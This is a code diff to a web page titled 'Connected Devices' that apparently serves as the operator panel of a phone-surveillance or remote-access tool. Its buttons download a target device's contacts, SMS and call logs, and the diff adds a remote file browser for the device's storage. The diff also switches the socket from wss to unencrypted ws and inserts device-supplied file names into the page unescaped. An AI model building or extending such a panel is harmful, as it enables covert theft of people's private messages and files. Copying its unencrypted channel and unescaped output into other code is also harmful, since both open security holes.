@@ -10,7 +10,7 @@
       background: #f4f4f4;
       padding: 2rem;
     }
-    h1 {
+    h1, h2 {
       color: #333;
     }
     .device {
@@ -31,14 +31,86 @@
       border-radius: 4px;
       cursor: pointer;
     }
+    .file-explorer {
+      background: white;
+      padding: 1rem;
+      margin-top: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      display: none;
+    }
+    .file-explorer-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+    .file-explorer-path {
+      font-weight: bold;
+      margin-bottom: 0.5rem;
+      word-break: break-all;
+    }
+    .file-explorer-breadcrumb {
+      background: #f8f9fa;
+      padding: 0.5rem;
+      border-radius: 4px;
+      margin-bottom: 1rem;
+    }
+    .file-item {
+      display: flex;
+      align-items: center;
+      padding: 0.5rem;
+      border-bottom: 1px solid #eee;
+      cursor: pointer;
+    }
+    .file-item:hover {
+      background: #f8f9fa;
+    }
+    .file-item-icon {
+      margin-right: 0.5rem;
+      font-size: 1.2rem;
+    }
+    .file-item-name {
+      flex-grow: 1;
+    }
+    .file-item-details {
+      color: #666;
+      font-size: 0.8rem;
+    }
+    .directory-icon {
+      color: #ffc107;
+    }
+    .file-icon {
+      color: #6c757d;
+    }
+    .loading {
+      text-align: center;
+      padding: 1rem;
+      color: #666;
+    }
   </style>
 </head>
 <body>
   <h1>Connected Devices</h1>
   <div id="deviceList">Loading...</div>
 
+  <div id="fileExplorer" class="file-explorer">
+    <div class="file-explorer-header">
+      <h2>File Explorer</h2>
+      <button class="btn" id="closeExplorer">Close</button>
+    </div>
+    <div class="file-explorer-breadcrumb">
+      <div class="file-explorer-path" id="currentPath">Loading...</div>
+    </div>
+    <div id="fileList">
+      <div class="loading">Loading...</div>
+    </div>
+  </div>
+
   <script>
-    const socket = new WebSocket(`wss://${location.host}`);
+    let currentDeviceId = null;
+    let currentPath = "/";
+    const socket = new WebSocket(`ws://${location.host}`);
 
     socket.addEventListener('open', () => {
       console.log('Connected to backend');
@@ -67,6 +139,7 @@
             <button class="btn" onclick="requestData('${device.id}', 'contacts')">Download Contacts</button>
             <button class="btn" onclick="requestData('${device.id}', 'sms')">Download SMS</button>
             <button class="btn" onclick="requestData('${device.id}', 'calls')">Download Call Logs</button>
+            <button class="btn" onclick="openFileExplorer('${device.id}')" ${!device.online ? 'disabled' : ''}>File Explorer</button>
           `;
           container.appendChild(el);
         });
@@ -84,6 +157,52 @@
         document.body.removeChild(link);
         URL.revokeObjectURL(url);
       }
+
+      if (message.type === 'fileExplorerResponse') {
+        const { deviceId, action, path, items, error } = message;
+        
+        // Only process if this is for the current device
+        if (deviceId !== currentDeviceId) return;
+        
+        if (error) {
+          alert(`Error: ${error}`);
+          return;
+        }
+
+        // Update current path
+        currentPath = path;
+        document.getElementById('currentPath').textContent = currentPath;
+        
+        // Render file list
+        const fileList = document.getElementById('fileList');
+        fileList.innerHTML = '';
+        
+        if (items && items.length > 0) {
+          items.forEach(item => {
+            const fileItem = document.createElement('div');
+            fileItem.className = 'file-item';
+            
+            if (item.type === 'directory') {
+              fileItem.innerHTML = `
+                <div class="file-item-icon directory-icon">📁</div>
+                <div class="file-item-name">${item.name}</div>
+                <div class="file-item-details">${formatDate(item.lastModified)}</div>
+              `;
+              fileItem.onclick = () => navigateTo(item.path);
+            } else {
+              fileItem.innerHTML = `
+                <div class="file-item-icon file-icon">📄</div>
+                <div class="file-item-name">${item.name}</div>
+                <div class="file-item-details">${formatFileSize(item.size)} - ${formatDate(item.lastModified)}</div>
+              `;
+            }
+            
+            fileList.appendChild(fileItem);
+          });
+        } else {
+          fileList.innerHTML = '<div class="loading">No files found</div>';
+        }
+      }
     });
 
     function requestData(deviceId, dataType) {
@@ -93,6 +212,52 @@
         dataType: dataType
       }));
     }
+
+    function openFileExplorer(deviceId) {
+      currentDeviceId = deviceId;
+      document.getElementById('fileExplorer').style.display = 'block';
+      
+      // Request root directory listing
+      socket.send(JSON.stringify({
+        type: 'fileExplorer',
+        targetId: deviceId,
+        action: 'listRoot',
+        path: '/'
+      }));
+      
+      currentPath = '/';
+      document.getElementById('currentPath').textContent = 'Loading...';
+      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
+    }
+
+    function navigateTo(path) {
+      socket.send(JSON.stringify({
+        type: 'fileExplorer',
+        targetId: currentDeviceId,
+        action: 'listDirectory',
+        path: path
+      }));
+      
+      document.getElementById('fileList').innerHTML = '<div class="loading">Loading...</div>';
+    }
+
+    function formatFileSize(bytes) {
+      if (bytes === 0) return '0 Bytes';
+      const k = 1024;
+      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    function formatDate(timestamp) {
+      return new Date(timestamp).toLocaleString();
+    }
+
+    // Close explorer button
+    document.getElementById('closeExplorer').addEventListener('click', () => {
+      document.getElementById('fileExplorer').style.display = 'none';
+      currentDeviceId = null;
+    });
   </script>
 </body>
 </html>
